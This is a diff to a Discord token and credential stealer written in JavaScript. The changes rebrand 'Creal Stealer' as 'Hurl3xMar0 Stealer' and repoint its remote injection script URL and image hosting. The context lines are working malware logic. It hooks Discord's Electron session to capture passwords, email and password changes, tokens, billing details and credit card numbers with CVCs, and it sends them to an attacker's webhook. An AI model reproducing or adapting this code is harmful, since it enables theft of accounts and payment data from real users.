@@ -17,9 +17,9 @@ var config = {
     "init-notify": "true",
     "embed-color": 2895667,
 
-    creator: "Ayhu",
+    creator: "Hurl3xMar0",
     transfer_link: `%TRANSFER_URL%`,
-    injection_url: "https://raw.githubusercontent.com/Ayhuuu/injection/main/inj.js",
+    injection_url: "https://raw.githubusercontent.com/xMar-O/injection/main/inj.js",
     webhook: "%WEBHOOK%",
     Placed: "%API_URL%",
     Filter: {
@@ -68,8 +68,8 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "Creal Stealer",
-        avatar_url: "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
+        username: "Hurl3xMar0 Stealer",
+        avatar_url: "http://217.182.38.7/xd.jpg",
         content: "",
         embeds: [{
             title: title,
@@ -77,11 +77,11 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: `Creal Stealer`
+                name: `Hurl3xMar0 Stealer`
             },
             
             footer: {
-                text: `�[${config.creator}] | https://github.com/Ayhuuu/`
+                text: `�[${config.creator}] | https://instagram.com/hurlexmaro`
             },
 
         }]
@@ -302,7 +302,7 @@ const FirstTime = async () => {
     var client_discord = appName
     if (!token) {
         var params = await makeEmbed({
-            title: "Creal Stealer Initialized",
+            title: "Hurl3xMar0 Stealer Initialized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
@@ -317,13 +317,13 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Ayhuuu/injection/main/banner.gif"
+        if (!user.avatar) var userAvatar = "http://217.182.38.7/xd.jpg"
+        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/xMar-O/injection/main/banner.gif"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: " Creal Stealer Initialized",
+            title: " Hurl3xMar0 Stealer Initialized",
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
             fields: [{
                 name: "Username <:username:1041634536733290596> ",
@@ -355,7 +355,7 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                value: `[Hurl3xMar0 Stealer <a:mavikirmizi:853238372591599617>](https://instagram.com/hurlexmaro)`,
                 inline: !0
             }, {
                 name: "Creal Files",
@@ -410,13 +410,13 @@ const FirstTime = async () => {
 
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
-            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Ayhuuu/injection/main/banner.gif"
+            if (!user.avatar) var userAvatar = "http://217.182.38.7/xd.jpg"
+            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/xMar-O/injection/main/banner.gif"
             
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
             var params = await makeEmbed({
-                title: "Creal Stealer Victim got logged out",
+                title: "Hurl3xMar0 Stealer Victim got logged out",
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [{
                     name: "Username <:username:1041634536733290596> ",
@@ -448,7 +448,7 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Creal Stealer  <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                    value: `[Hurl3xMar0 Stealer  <a:mavikirmizi:853238372591599617>](https://instagram.com/hurlexmaro)`,
                     inline: !0
                 }, {
                     name: "Creal Files",
@@ -584,8 +584,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Ayhuuu/injection/main/banner.gif"
+    if (!user.avatar) var userAvatar = "http://217.182.38.7/xd.jpg"
+    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/xMar-O/injection/main/banner.gif"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -601,7 +601,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: "Creal Stealer User Login",
+                title: "Hurl3xMar0 Stealer User Login",
                 color: config['embed-color'],
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [{
@@ -634,7 +634,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                    value: `[Hurl3xMar0 Stealer <a:mavikirmizi:853238372591599617>](https://instagram.com/hurlexmaro)`,
                     inline: !0
                 }, {
                     name: "Creal Files",
@@ -686,7 +686,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "Creal Stealer Detect Password Changed",
+                    title: "Hurl3xMar0 Stealer Detect Password Changed",
                     color: config['embed-color'],
                     description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
@@ -719,7 +719,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                        value: `[Hurl3xMar0 Stealer <a:mavikirmizi:853238372591599617>](https://instagram.com/hurlexmaro)`,
                         inline: !0
                     }, {
                         name: "Creal Files",
@@ -773,7 +773,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "Creal Stealer Detect Email Changed",
+                    title: "Hurl3xMar0 Stealer Detect Email Changed",
                     color: config['embed-color'],
                     description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
@@ -806,7 +806,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                        value: `[Hurl3xMar0 Stealer <a:mavikirmizi:853238372591599617>](https://instagram.com/hurlexmaro)`,
                         inline: !0
                     }, {
                         name: "Creal Files",
@@ -859,7 +859,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
     
                 var params = await makeEmbed({
-                    title: "Creal Stealer User Credit Card Added",
+                    title: "Hurl3xMar0 Stealer User Credit Card Added",
                     color: config['embed-color'],
                     fields: [
                       { name: "Creal Files", value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})` },
